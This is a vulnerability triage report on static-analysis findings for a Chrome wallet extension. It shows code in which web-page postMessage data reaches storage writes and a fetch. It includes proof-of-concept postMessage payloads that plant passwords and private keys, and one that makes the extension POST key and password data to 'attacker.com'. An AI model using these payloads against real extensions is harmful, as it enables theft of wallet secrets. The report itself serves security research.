# CoCo Analysis: dkbekhkogoekbeibnlcbfnagacokaaja

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10 (8 storage sinks + 1 fetch sink with multiple variations)

---

## Sink 1-8: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dkbekhkogoekbeibnlcbfnagacokaaja/opgen_generated_files/cs_0.js
Line 468    window.addEventListener("message", function (event) {
Line 469    chrome.runtime.sendMessage({ message: event.data }, (backData) => {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dkbekhkogoekbeibnlcbfnagacokaaja/opgen_generated_files/bg.js
Line 1030    savePassword(data.message.data)
Line 967    chrome.storage.local.set({ password })
```

**Code:**

```javascript
// Content script (cs_0.js line 468) - Entry point
window.addEventListener("message", function (event) {
  chrome.runtime.sendMessage({ message: event.data }, (backData) => { // ← attacker-controlled
    if (backData) {
      this.window.postMessage(backData,"*")
    }
  });
});

// Background script (bg.js line 1027+) - Message handler
chrome.runtime.onMessage.addListener( (data, sender, sendResponse) => {
  // Storage poisoning - saves attacker data to storage
  if (data.message.msg == 'dq-savePassword') {
    savePassword(data.message.data) // ← attacker-controlled
  }
  if (data.message.msg == 'dq-savePrivateKey') {
    savePrivateKey(data.message.data) // ← attacker-controlled
  }
  if (data.message.msg == 'dq-useAccount') {
    chrome.storage.local.set({ currentAccount: JSON.parse(data.message.data) }) // ← attacker-controlled
  }
  if (data.message.msg == 'dq-updateAccountName') {
    let accountInfo = JSON.parse(data.message.data) // ← attacker-controlled
    updateAccountName(accountInfo)
  }
  return true
});

function savePassword (password) {
  chrome.storage.local.set({ password }) // Storage sink
}

function savePrivateKey (account) {
  chrome.storage.local.get(['privateKeyList'], res => {
    let list = res['privateKeyList'] || []
    list.push(account) // ← attacker-controlled account data
    chrome.storage.local.set({ privateKeyList:list }) // Storage sink
  })
}

function updateAccountName (account) {
  chrome.storage.local.get(['privateKeyList'], res => {
    let list = res['privateKeyList'] || []
    for (let i = 0; i < list.length; i++) {
      if (account.address === list[i].address) { // ← attacker-controlled
        list[i].accountName = account.accountName // ← attacker-controlled
      }
    }
    chrome.storage.local.set({ privateKeyList:list }) // Storage sink
  })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Malicious webpage can poison extension storage with arbitrary data
window.postMessage({
  msg: 'dq-savePassword',
  data: 'attacker_password'
}, "*");

window.postMessage({
  msg: 'dq-savePrivateKey',
  data: {
    address: 'attacker_address',
    privateKey: 'attacker_private_key',
    accountName: 'Attacker Account'
  }
}, "*");

window.postMessage({
  msg: 'dq-useAccount',
  data: JSON.stringify({
    address: 'attacker_controlled_address',
    accountName: 'Malicious Account'
  })
}, "*");
```

**Impact:** Complete storage exploitation - attacker can write arbitrary data to chrome.storage.local, including passwords, private keys, and account information. While storage poisoning alone would be a false positive, this extension also allows retrieval via sendResponse, making it a complete exploitation chain.

---

## Sink 9: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dkbekhkogoekbeibnlcbfnagacokaaja/opgen_generated_files/cs_0.js
Line 468    window.addEventListener("message", function (event) {
Line 469    chrome.runtime.sendMessage({ message: event.data }, (backData) => {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dkbekhkogoekbeibnlcbfnagacokaaja/opgen_generated_files/bg.js
Line 1122    let info = JSON.parse(data.message.data)
Line 1013    fetch(`${data.url}/auth/custody/privatekey`, {
```

**Code:**

```javascript
// Content script - Entry point (same as above)
window.addEventListener("message", function (event) {
  chrome.runtime.sendMessage({ message: event.data }, (backData) => { // ← attacker-controlled
    if (backData) {
      this.window.postMessage(backData,"*")
    }
  });
});

// Background script - fetch with attacker-controlled URL
chrome.runtime.onMessage.addListener( (data, sender, sendResponse) => {
  if (data.message.msg == 'dq-trusteeship') {
    let info = JSON.parse(data.message.data) // ← attacker-controlled
    trusteeship(info).then(res => {
      sendResponse({type:'dq-trusteeship',data:res.ok})
    })
  }
  return true
});

function trusteeship (data) {
  const params = JSON.stringify({
    privateKey:data.privateKey, // ← attacker-controlled
    password: data.password,    // ← attacker-controlled
  });

  return new Promise((resolve, reject) => {
    fetch(`${data.url}/auth/custody/privatekey`, { // ← attacker-controlled URL
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: params, // ← attacker-controlled body
    })
      .then((res) => resolve(res))
      .catch((error) => reject(error));
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// SSRF - Send privileged requests to attacker-controlled URL
window.postMessage({
  msg: 'dq-trusteeship',
  data: JSON.stringify({
    url: 'https://attacker.com',
    privateKey: 'stolen_key',
    password: 'stolen_password'
  })
}, "*");
```

**Impact:** SSRF vulnerability - attacker can make the extension send privileged cross-origin POST requests to attacker-controlled URLs with arbitrary payloads. The extension will send sensitive data (privateKey, password) to the attacker's server.
